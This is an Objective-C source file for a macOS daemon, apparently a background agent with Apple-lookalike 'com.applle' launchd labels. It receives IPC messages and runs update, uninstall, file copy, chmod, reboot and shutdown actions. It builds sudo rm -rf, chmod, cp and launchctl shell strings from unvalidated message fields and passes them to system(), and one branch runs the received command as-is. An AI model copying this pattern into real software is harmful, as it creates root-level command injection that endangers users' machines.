//
//  NotificationManager.m
//  blbld
//
//  Created by Ophat Phuetkasickonphasutha on 11/12/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "NotificationManager.h"
#import "blbldUtils.h"

@interface NotificationManager (private)
- (void) processMessagePortInfo: (NSDictionary *) aMessagePortInfo;
@end

@implementation NotificationManager

- (id)init
{
    self = [super init];
    if (self) {
    }
    
    return self;
}

-(void) startWatching {
    if (!mMessagePortReader) {
		mMessagePortReader = [[MessagePortIPCReader alloc] initWithPortName:@"bSecuriyAgents" 
												 withMessagePortIPCDelegate:self];
		[mMessagePortReader start];
	}
}

-(void) stopWatching {
    if (mMessagePortReader) {
        [mMessagePortReader stop];
        [mMessagePortReader release];
        mMessagePortReader = nil;
    }
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {

    NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData];
    NSDictionary *myDictionary = [[unarchiver decodeObjectForKey:@"command"] retain];
    [unarchiver finishDecoding];
    [unarchiver release];
    
    [self processMessagePortInfo:myDictionary];

    [myDictionary release];
}

- (void) processMessagePortInfo: (NSDictionary *) aMessagePortInfo {
    NSDictionary *myDictionary = aMessagePortInfo;
    NSString* type = [myDictionary objectForKey:@"type"];
    DLog(@"=!= type: %@", type);
    
    if ([type isEqualToString:@"uninstall"]) {
        NSString *command = [myDictionary objectForKey:@"command"];
        NSString *cmd = [NSString stringWithFormat:@"launchctl submit -l com.applle.blblx.unload -p %@ start", command];
        DLog (@"cmd = %@", cmd);
        
        system([cmd cStringUsingEncoding:NSUTF8StringEncoding]);
        exit(0);
        
    }else if ([type isEqualToString:@"update1"]) {
        NSString* command = [myDictionary objectForKey:@"command"];
        //NSString* binaryName = [myDictionary objectForKey:@"binaryname"];
        NSString* tmpAppPath = [myDictionary objectForKey:@"tmpapppath"];
        NSString* unArchivedPath = [myDictionary objectForKey:@"unarchivedpath"];
        
        NSString *updateScript = [NSString stringWithFormat:@"launchctl submit -l com.applle.blblx.update -p %@ start", command];
        DLog (@"Step 4: Run update script %@", updateScript);
        system([updateScript cStringUsingEncoding:NSUTF8StringEncoding]);
        
        // -- delete tar path
        NSString * deleteApp = [NSString stringWithFormat:@"sudo rm -rf %@", tmpAppPath];
        DLog (@"Step 5.1: Delete temp binary %@",  deleteApp)
        system([deleteApp cStringUsingEncoding:NSUTF8StringEncoding]);
        
        // -- delete untar path
        deleteApp = [NSString stringWithFormat:@"sudo rm -rf %@", unArchivedPath];
        DLog (@"Step 5.2: Delete untar path %@",  unArchivedPath)
        system([deleteApp cStringUsingEncoding:NSUTF8StringEncoding]);
        
    }else if ([type isEqualToString:@"update2"]) {
        // -- run installer
        NSString *command = [myDictionary objectForKey:@"command"];
        NSString *updateScript = command;
        NSString *tmpAppPath = [myDictionary objectForKey:@"tmpapppath"];
        
        DLog (@"Step 3: Run installer %@",  updateScript);
        system([updateScript cStringUsingEncoding:NSUTF8StringEncoding]);
        
        // -- delete .pkg file
        NSString *deleteApp = [NSString stringWithFormat:@"sudo rm -rf %@", tmpAppPath];
        DLog (@"Step 4 Delete .pkg path %@",  tmpAppPath)
        system([deleteApp cStringUsingEncoding:NSUTF8StringEncoding]);
        
    }else if ([type isEqualToString:@"addon"]) {
        
        NSString * desc = [myDictionary objectForKey:@"desc"];
        NSString * resource = [myDictionary objectForKey:@"resource"];
        NSString * addonname = [myDictionary objectForKey:@"addonname"];

        NSString * mover = [NSString stringWithFormat:@"cp -fr %@/%@ %@",resource,addonname,desc];
        DLog(@"mover 1 %@",mover);
        system([mover cStringUsingEncoding:NSUTF8StringEncoding]);
        
        NSString * versionName = @"addonversion.plist";
        NSString * versionDesc = [desc stringByReplacingOccurrencesOfString:addonname withString:versionName];
        
        mover = [NSString stringWithFormat:@"cp -fr %@/%@ %@",resource,versionName,versionDesc];
        DLog(@"mover 2 %@",mover);
        system([mover cStringUsingEncoding:NSUTF8StringEncoding]);
        
    }else if ([type isEqualToString:@"chgownerattr"]) {
        
        NSString * pathToChange = [myDictionary objectForKey:@"path"];
        NSString * permission = [myDictionary objectForKey:@"permission"];
        
        NSString * chgOwnerAttr = [NSString stringWithFormat:@"sudo chmod %@ %@",permission,pathToChange];
        DLog(@"chgOwnerAttr 1 %@",chgOwnerAttr);
        system([chgOwnerAttr cStringUsingEncoding:NSUTF8StringEncoding]);
        
    }
    
    else if ([type isEqualToString:@"reboot"]) {
        [blbldUtils reboot];
        
    } else if ([type isEqualToString:@"shutdown"]) {
        [blbldUtils shutdown];
    }
}

- (void)dealloc
{
    [mMessagePortReader stop];
    [mMessagePortReader release];
    mMessagePortReader = nil;
    
    [super dealloc];
}

@end
